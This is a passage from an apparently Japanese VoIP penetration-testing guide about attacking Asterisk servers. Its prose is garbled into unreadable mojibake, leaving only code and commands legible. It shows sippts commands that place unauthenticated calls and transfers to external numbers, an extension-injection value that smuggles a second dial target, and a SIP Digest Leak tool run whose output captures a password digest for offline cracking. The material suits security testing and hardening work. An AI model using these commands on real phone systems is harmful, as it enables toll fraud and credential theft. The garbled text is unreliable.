ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ‰ã¯ã€**INFO SIPãƒ¡ãƒƒã‚»ãƒ¼ã‚¸**ã€**ã‚ªãƒ¼ãƒ‡ã‚£ã‚ª**å†…ã€ã¾ãŸã¯**RTPãƒ‘ã‚±ãƒƒãƒˆ**å†…ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚RTPãƒ‘ã‚±ãƒƒãƒˆå†…ã«ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€ä¼šè©±ã®ãã®éƒ¨åˆ†ã‚’åˆ‡ã‚Šå–ã‚Šã€ãƒ„ãƒ¼ãƒ«multimoã‚’ä½¿ç”¨ã—ã¦æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
multimon -a DTMF -t wac pin.wav
```
### ç„¡æ–™é€šè©± / Asterisksæ¥ç¶šã®è¨­å®šãƒŸã‚¹

Asteriskã§ã¯ã€ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®æ¥ç¶šã¾ãŸã¯ä»»æ„ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®æ¥ç¶šã‚’è¨±å¯ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```
host=10.10.10.10
host=dynamic
```
IPã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæŒ‡å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ›ã‚¹ãƒˆã¯å®šæœŸçš„ã«REGISTERãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆREGISTERãƒ‘ã‚±ãƒƒãƒˆã«ã¯é€šå¸¸30åˆ†ã®æœ‰åŠ¹æœŸé™ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ä»–ã®ã‚·ãƒŠãƒªã‚ªã§ã¯é›»è©±æ©Ÿã¯30åˆ†ã”ã¨ã«REGISTERã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ãŸã ã—ã€VoIPã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®é€šè©±ã‚’å—ã‘ã‚‹ãŸã‚ã«ã¯ã€é–‹ã„ã¦ã„ã‚‹ãƒãƒ¼ãƒˆã‚’æŒã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å®šç¾©ã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã§ãã¾ã™ï¼š

- **`type=user`**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã®ã¿é€šè©±ã‚’å—ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- **`type=friend`**ï¼šãƒ”ã‚¢ã¨ã—ã¦é€šè©±ã‚’è¡Œã„ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦å—ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆæ‹¡å¼µæ©Ÿèƒ½ã¨ä¸€ç·’ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼‰ã€‚
- **`type=peer`**ï¼šãƒ”ã‚¢ã¨ã—ã¦é€šè©±ã‚’é€å—ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆSIPãƒˆãƒ©ãƒ³ã‚¯ï¼‰ã€‚

ã¾ãŸã€æ¬¡ã®ã‚ˆã†ã«å®‰å…¨ã§ãªã„å¤‰æ•°ã‚’ä½¿ç”¨ã—ã¦ä¿¡é ¼é–¢ä¿‚ã‚’ç¢ºç«‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š

- **`insecure=port`**ï¼šIPã«ã‚ˆã£ã¦æ¤œè¨¼ã•ã‚ŒãŸãƒ”ã‚¢æ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
- **`insecure=invite`**ï¼šINVITEãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®èªè¨¼ã‚’å¿…è¦ã¨ã—ã¾ã›ã‚“ã€‚
- **`insecure=port,invite`**ï¼šä¸¡æ–¹

{% hint style="warning" %}
**`type=friend`**ãŒä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã€**host**å¤‰æ•°ã®**å€¤ã¯ä½¿ç”¨ã•ã‚Œã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€ç®¡ç†è€…ãŒãã®å€¤ã‚’ä½¿ç”¨ã—ã¦SIPãƒˆãƒ©ãƒ³ã‚¯ã‚’èª¤ã£ã¦è¨­å®šã—ãŸå ´åˆã€**èª°ã§ã‚‚ãã‚Œã«æ¥ç¶šã§ãã‚‹**ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ãŸã¨ãˆã°ã€æ¬¡ã®è¨­å®šã¯è„†å¼±ã§ã™ï¼š\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### ç„¡æ–™é€šè©±/ã‚¢ã‚¹ã‚¿ãƒªã‚¹ã‚¯ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®èª¤æ§‹æˆ

ã‚¢ã‚¹ã‚¿ãƒªã‚¹ã‚¯ã§ã¯ã€**ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã¯ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³å†…ã®é–¢é€£ã™ã‚‹æ‹¡å¼µæ©Ÿèƒ½ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã€ãŠã‚ˆã³ãƒ«ãƒ¼ãƒ«ã‚’**ã‚°ãƒ«ãƒ¼ãƒ—åŒ–ã™ã‚‹ãŸã‚ã®åå‰ä»˜ãã®ã‚³ãƒ³ãƒ†ãƒŠã¾ãŸã¯ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã§ã™ã€‚ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ã¯ã‚¢ã‚¹ã‚¿ãƒªã‚¹ã‚¯ã‚·ã‚¹ãƒ†ãƒ ã®ä¸­æ ¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã‚ã‚Šã€**ç€ä¿¡ãŠã‚ˆã³ç™ºä¿¡é€šè©±ã®å‡¦ç†ã¨ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æ–¹æ³•**ã‚’å®šç¾©ã—ã¾ã™ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ã‚’æ•´ç†ã—ã€ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’ç®¡ç†ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã®ç•°ãªã‚‹éƒ¨åˆ†ã‚’åˆ†é›¢ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

å„ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯é€šå¸¸ã€**`extensions.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ãªã©ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã§å®šç¾©ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯è§’æ‹¬å¼§ã§ç¤ºã•ã‚Œã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆåãŒãã®å†…éƒ¨ã«å«ã¾ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```bash
csharpCopy code[my_context]
```
ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå†…ã§ã¯ã€æ‹¡å¼µå­ï¼ˆãƒ€ã‚¤ãƒ¤ãƒ«ç•ªå·ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼‰ã‚’å®šç¾©ã—ã€ãã‚Œã‚‰ã‚’ä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨é–¢é€£ä»˜ã‘ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€é€šè©±ã®å‡¦ç†æ–¹æ³•ã‚’æ±ºå®šã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
ã“ã®ä¾‹ã§ã¯ã€æ‹¡å¼µæ©Ÿèƒ½ã€Œ100ã€ã‚’æŒã¤å˜ç´”ãªã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã€Œmy\_contextã€ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚èª°ã‹ãŒ100ã‚’ãƒ€ã‚¤ãƒ¤ãƒ«ã™ã‚‹ã¨ã€é€šè©±ãŒå—ã‘ä»˜ã‘ã‚‰ã‚Œã€ã‚¦ã‚§ãƒ«ã‚«ãƒ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå†ç”Ÿã•ã‚ŒãŸå¾Œã€é€šè©±ãŒçµ‚äº†ã—ã¾ã™ã€‚

ã“ã‚Œã¯**åˆ¥ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã§ã€**ä»–ã®ä»»æ„ã®ç•ªå·ã«ç™ºä¿¡ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
ã‚‚ã—ç®¡ç†è€…ãŒ**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å®šç¾©ã—ãŸå ´åˆ:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ã©ã‚“ãªäººã§ã‚‚**ã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦ä»–ã®ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼ˆãã—ã¦ã‚µãƒ¼ãƒãƒ¼ã®ç®¡ç†è€…ãŒé€šè©±æ–™é‡‘ã‚’æ”¯æ‰•ã†ã“ã¨ã«ãªã‚Šã¾ã™ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
ã•ã‚‰ã«ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯**`sip.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯**`allowguest=true`**ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€**èªè¨¼ãªã—ã®**æ”»æ’ƒè€…ã¯ã©ã‚“ãªä»–ã®ç•ªå·ã«ã‚‚é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

*   [**sippts**](https://github.com/Pepelux/sippts)ã®**`sipinvite.py`**ï¼šSipinviteã¯ã€**èªè¨¼ãªã—ã§PBXã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã—ã¾ã™ã€‚SIPã‚µãƒ¼ãƒãƒ¼ãŒæ­£ã—ãæ§‹æˆã•ã‚Œã¦ã„ãªã„å ´åˆã€å¤–éƒ¨ã®ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€é€šè©±ã‚’ç¬¬äºŒã®å¤–éƒ¨ç•ªå·ã«è»¢é€ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

ãŸã¨ãˆã°ã€Asteriskã‚µãƒ¼ãƒãƒ¼ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®æ§‹æˆãŒæ‚ªã„å ´åˆã€èªè¨¼ãªã—ã§INVITEãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®å ´åˆã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã‚‰ãªãã¦ã‚‚é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### ç„¡æ–™é€šè©± / è¨­å®šãƒŸã‚¹ã®ã‚ã‚‹IVRS

IVRSã¯ã€**ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–éŸ³å£°å¿œç­”ã‚·ã‚¹ãƒ†ãƒ **ã®ç•¥ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒéŸ³å£°ã¾ãŸã¯ã‚¿ãƒƒãƒãƒˆãƒ¼ãƒ³å…¥åŠ›ã‚’ä»‹ã—ã¦ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿åŒ–ã•ã‚ŒãŸã‚·ã‚¹ãƒ†ãƒ ã¨å¯¾è©±ã™ã‚‹ãŸã‚ã®é›»è©±æŠ€è¡“ã§ã™ã€‚ IVRSã¯ã€æƒ…å ±ã®æä¾›ã€é€šè©±ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã®åé›†ãªã©ã€ã•ã¾ã–ã¾ãªæ©Ÿèƒ½ã‚’æä¾›ã™ã‚‹**è‡ªå‹•é€šè©±å‡¦ç†**ã‚·ã‚¹ãƒ†ãƒ ã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

VoIPã‚·ã‚¹ãƒ†ãƒ ã®IVRSã¯é€šå¸¸ã€æ¬¡ã®è¦ç´ ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ï¼š

1. **éŸ³å£°ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆ**ï¼šIVRãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¨æŒ‡ç¤ºã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ¡ˆå†…ã™ã‚‹ãŸã‚ã®äº‹å‰éŒ²éŸ³ã•ã‚ŒãŸéŸ³å£°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã€‚
2. **DTMF**ï¼ˆãƒ‡ãƒ¥ã‚¢ãƒ«ãƒˆãƒ¼ãƒ³ãƒãƒ«ãƒãƒ•ãƒªãƒ¼ã‚¯ã‚¨ãƒ³ã‚·ãƒ¼ï¼‰ã‚·ã‚°ãƒŠãƒªãƒ³ã‚°ï¼šé›»è©±ã®ã‚­ãƒ¼ã‚’æŠ¼ã—ã¦ç”Ÿæˆã•ã‚Œã‚‹ã‚¿ãƒƒãƒãƒˆãƒ¼ãƒ³å…¥åŠ›ã§ã€IVRãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã—ã€å…¥åŠ›ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
3. **é€šè©±ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã«åŸºã¥ã„ã¦ã€ç‰¹å®šã®éƒ¨é–€ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã€ã¾ãŸã¯æ‹¡å¼µå­ãªã©ã€é©åˆ‡ãªå®›å…ˆã«é€šè©±ã‚’èª˜å°ã™ã‚‹ã“ã¨ã€‚
4. **ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®åé›†**ï¼šå£é ­ã§ã®æƒ…å ±ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆç•ªå·ã€ã‚±ãƒ¼ã‚¹IDã€ã¾ãŸã¯ãã®ä»–ã®é–¢é€£ãƒ‡ãƒ¼ã‚¿ãªã©ã€ç™ºä¿¡è€…ã‹ã‚‰ã®æƒ…å ±ã®åé›†ã€‚
5. **å¤–éƒ¨ã‚·ã‚¹ãƒ†ãƒ ã¨ã®çµ±åˆ**ï¼šIVRã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ä»–ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚·ã‚¹ãƒ†ãƒ ã«æ¥ç¶šã—ã¦ã€æƒ…å ±ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚„æ›´æ–°ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®å®Ÿè¡Œã€ã‚¤ãƒ™ãƒ³ãƒˆã®ãƒˆãƒªã‚¬ãƒ¼ãªã©ã‚’è¡Œã†ã€‚

Asterisk VoIPã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ï¼ˆ**`extensions.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ï¼‰ã‚„`Background()`ã€`Playback()`ã€`Read()`ãªã©ã®ã•ã¾ã–ã¾ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦IVRã‚’ä½œæˆã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€éŸ³å£°ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã®å†ç”Ÿã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®åé›†ã€é€šè©±ãƒ•ãƒ­ãƒ¼ã®åˆ¶å¾¡ã‚’æ”¯æ´ã—ã¾ã™ã€‚

#### è„†å¼±ãªè¨­å®šã®ä¾‹
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
å‰è¿°ã®ä¾‹ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦ã€Œ1ã‚’æŠ¼ã—ã¦éƒ¨ç½²ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã€ã€Œ2ã‚’æŠ¼ã—ã¦åˆ¥ã®éƒ¨ç½²ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã€ã¾ãŸã¯ã€Œå®Œå…¨ãªå†…ç·šç•ªå·ã€ã‚’å…¥åŠ›ã™ã‚‹ã‚ˆã†ã«æ±‚ã‚ã¦ã„ã¾ã™ã€‚\
ã“ã®è„†å¼±æ€§ã¯ã€æŒ‡å®šã•ã‚ŒãŸå†…ç·šç•ªå·ã®é•·ã•ãŒãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ5ç§’ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã‚’å®Œå…¨ãªç•ªå·ã¨ã—ã¦å…¥åŠ›ã™ã‚‹ã“ã¨ãŒã§ãã€ãã‚ŒãŒå‘¼ã³å‡ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚

### å†…ç·šç•ªå·ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

æ¬¡ã®ã‚ˆã†ãªå†…ç·šç•ªå·ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹**å†…ç·š**ã§ã‚ã‚Šã€**ext 101ãŒå…¥åŠ›ã•ã‚ŒãŸå ´åˆ**ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã“ã¨ãŒèµ·ã“ã‚Šã¾ã™:
```scss
exten => 101,1,Dial(SIP/101)
```
ã—ã‹ã—ã€`${EXTEN}`ãŒæ•°å­—ä»¥å¤–ã®ã‚‚ã®ï¼ˆå¤ã„Asteriskãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ã‚ˆã†ãªï¼‰ã‚’å°å…¥ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯`101&SIP123123123`ã‚’å°å…¥ã—ã¦é›»è©±ç•ªå·123123123ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€ãã®çµæœã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
ã—ãŸãŒã£ã¦ã€æ‹¡å¼µå­**`101`**ã¨**`123123123`**ã¸ã®é€šè©±ãŒé€ä¿¡ã•ã‚Œã€æœ€åˆã®é€šè©±ã®ã¿ãŒç¢ºç«‹ã•ã‚Œã¾ã™...ã—ã‹ã—ã€æ”»æ’ƒè€…ãŒ**ä¸€è‡´ã—ã¦ã„ã‚‹ãŒå­˜åœ¨ã—ãªã„**æ‹¡å¼µå­ã‚’ä½¿ç”¨ã—ã¦ã€æœ›ã¾ã—ã„ç•ªå·ã«ã®ã¿é€šè©±ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## SIPDigestLeak

SIP Digest Leakã¯ã€ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãŠã‚ˆã³ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®IPé›»è©±æ©Ÿã€ãŠã‚ˆã³é›»è©±ã‚¢ãƒ€ãƒ—ã‚¿ï¼ˆVoIPã‹ã‚‰ã‚¢ãƒŠãƒ­ã‚°ã¸ã®å¤‰æ›è£…ç½®ï¼‰ã‚’å«ã‚€å¤šãã®SIPé›»è©±æ©Ÿã«å½±éŸ¿ã‚’ä¸ãˆã‚‹è„†å¼±æ€§ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‹ã‚‰è¨ˆç®—ã•ã‚Œã‚‹Digestèªè¨¼å¿œç­”ãŒæ¼æ´©ã—ã¾ã™ã€‚ãã®å¾Œã€ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ”»æ’ƒãŒå¯èƒ½ã¨ãªã‚Šã€ãƒãƒ£ãƒ¬ãƒ³ã‚¸ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«åŸºã¥ã„ã¦ã»ã¨ã‚“ã©ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å›å¾©ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

è„†å¼±æ€§ã®ã‚·ãƒŠãƒªã‚ªï¼ˆ[**è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)ï¼‰ï¼š

1. IPé›»è©±ï¼ˆè¢«å®³è€…ï¼‰ãŒãƒãƒ¼ãƒˆ5060ã§ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã€é›»è©±ã‚’å—ã‘ä»˜ã‘ã¾ã™ã€‚
2. æ”»æ’ƒè€…ãŒIPé›»è©±ã«INVITEã‚’é€ä¿¡ã—ã¾ã™ã€‚
3. è¢«å®³è€…ã®é›»è©±ãŒé³´ã‚Šã€èª°ã‹ãŒé›»è©±ã«å‡ºã¦åˆ‡ã‚Šã¾ã™ï¼ˆä»–ã®ç«¯æœ«ã§é›»è©±ã«å¿œç­”ã—ãªã„ãŸã‚ï¼‰ã€‚
4. é›»è©±ãŒåˆ‡æ–­ã•ã‚Œã‚‹ã¨ã€**è¢«å®³è€…ã®é›»è©±ã¯æ”»æ’ƒè€…ã«BYEã‚’é€ä¿¡**ã—ã¾ã™ã€‚
5. æ”»æ’ƒè€…ã¯**èªè¨¼ã‚’è¦æ±‚ã™ã‚‹407ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã‚’ç™ºè¡Œã—ã€èªè¨¼ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã‚’ç™ºè¡Œã—ã¾ã™ã€‚
6. **è¢«å®³è€…ã®é›»è©±ã¯2ç•ªç›®ã®BYEã§èªè¨¼ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«å¿œç­”**ã—ã¾ã™ã€‚
7. æ”»æ’ƒè€…ã¯ãã®å¾Œã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ï¼ˆã¾ãŸã¯åˆ†æ•£ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãªã©ï¼‰ã§ãƒãƒ£ãƒ¬ãƒ³ã‚¸ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å¯¾ã™ã‚‹ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’å®Ÿè¡Œã—ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* [**sippts**](https://github.com/Pepelux/sippts)ã®**sipdigestleak.py**ï¼šSipDigestLeakã¯ã€ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Callã¯ã€ä¾‹ãˆã°è£½å“ã«èˆˆå‘³ã‚’æŒã¤**ã‚¦ã‚§ãƒ–ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒã€**é›»è©±ç•ªå·**ã‚’å…¥åŠ›ã—ã¦é›»è©±ã‚’å—ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã‚‚ã®ã§ã™ã€‚ãã®å¾Œã€åºƒå‘ŠãŒå‘¼ã³å‡ºã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**é›»è©±ã«å‡ºã‚‹ã¨**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨æ¥ç¶šã•ã‚Œã¦å‘¼ã³å‡ºã•ã‚Œã¾ã™**ã€‚

ã“ã‚Œã«å¯¾ã™ã‚‹ä¸€èˆ¬çš„ãªAsteriskã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* å‰ã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã§ã¯ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒã‚ã‹ã£ã¦ã„ã‚Œã°ã©ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã§ã‚‚æ¥ç¶šã§ãã‚‹**ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚
